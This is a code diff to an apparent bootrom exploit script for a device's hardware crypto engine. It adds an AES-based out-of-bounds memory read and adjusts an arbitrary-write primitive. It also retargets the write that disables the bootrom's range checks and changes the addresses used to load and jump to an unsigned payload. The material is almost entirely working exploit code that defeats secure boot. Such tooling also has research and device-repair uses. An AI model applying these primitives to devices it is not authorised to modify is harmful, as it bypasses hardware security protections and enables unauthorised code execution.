@@ -21,8 +21,13 @@ def init(dev):
 
 
 def hw_acquire(dev):
-    dev.write32(CRYPTO_BASE, [0x1F, 0x12000])
+    dev.write32(CRYPTO_BASE, dev.read32(CRYPTO_BASE) & 0xFFFFFFF0)
+    dev.write32(CRYPTO_BASE, dev.read32(CRYPTO_BASE) | 0xF)
+    dev.write32(CRYPTO_BASE + 0x04, dev.read32(CRYPTO_BASE + 0x04) & 0xFFFFDFFF)
 
+def hw_release(dev):
+    dev.write32(CRYPTO_BASE, dev.read32(CRYPTO_BASE) & 0xFFFFFFF0)
+    dev.write32(CRYPTO_BASE, dev.read32(CRYPTO_BASE) | 0xF)
 
 def call_func(dev, func):
     dev.write32(CRYPTO_BASE + 0x0804, 3)
@@ -45,11 +50,26 @@ def call_func(dev, func):
     return result
 
 
+def aes_read16(dev, addr):
+    dev.write32(CRYPTO_BASE + 0xC04, addr)
+    dev.write32(CRYPTO_BASE + 0xC08, 0) # dst to invalid pointer
+    dev.write32(CRYPTO_BASE + 0xC0C, 1)
+    dev.write32(CRYPTO_BASE + 0xC14, 18)
+    dev.write32(CRYPTO_BASE + 0xC18, 26)
+    dev.write32(CRYPTO_BASE + 0xC1C, 26)
+    if call_func(dev, 126) != 0: # aes decrypt
+        raise Exception("failed to call the function!")
+    words = dev.read32(CRYPTO_BASE + 0xC00 + 26 * 4, 4) # read out of the IV
+    data = b""
+    for word in words:
+        data += struct.pack("<I", word)
+    return data
+
 def aes_write16(dev, addr, data):
     if len(data) != 16:
         raise RuntimeError("data must be 16 bytes")
 
-    pattern = bytes.fromhex("4dd12bdf0ec7d26c482490b3482a1b1f")
+    pattern = bytes.fromhex("6c38d88958fd0cf51efd9debe8c265a5")
 
     # iv-xor
     words = []
@@ -65,7 +85,7 @@ def aes_write16(dev, addr, data):
 
     dev.write32(CRYPTO_BASE + 0xC00 + 26 * 4, words)
 
-    dev.write32(CRYPTO_BASE + 0xC04, 0) # src to VALID address which has all zeroes (otherwise, update pattern)
+    dev.write32(CRYPTO_BASE + 0xC04, 0xE680) # src to VALID address which has all zeroes (otherwise, update pattern)
     dev.write32(CRYPTO_BASE + 0xC08, addr) # dst to our destination
     dev.write32(CRYPTO_BASE + 0xC0C, 1)
     dev.write32(CRYPTO_BASE + 0xC14, 18)
@@ -91,7 +111,7 @@ def load_payload(dev, path):
     dev.run_ext_cmd(0xB1)
 
     log("Disable bootrom range checks")
-    aes_write16(dev, 0x102868, bytes.fromhex("00000000000000000000000080000000"))
+    aes_write16(dev, 0x102870, bytes.fromhex("00000000000000000000000080000000"))
 
     with open(path, "rb") as fin:
         payload = fin.read()
@@ -106,10 +126,11 @@ def load_payload(dev, path):
         words.append(word)
 
     log("Send payload")
-    dev.write32(0x201000, words)
+    load_addr = 0x21F000
+    dev.write32(load_addr, words)
 
     log("Let's rock")
-    dev.write32(0x1028A8, 0x201000, status_check=False)
+    dev.write32(0x1028B0, load_addr, status_check=False)
 
     log("Wait for the payload to come online...")
     dev.wait_payload()
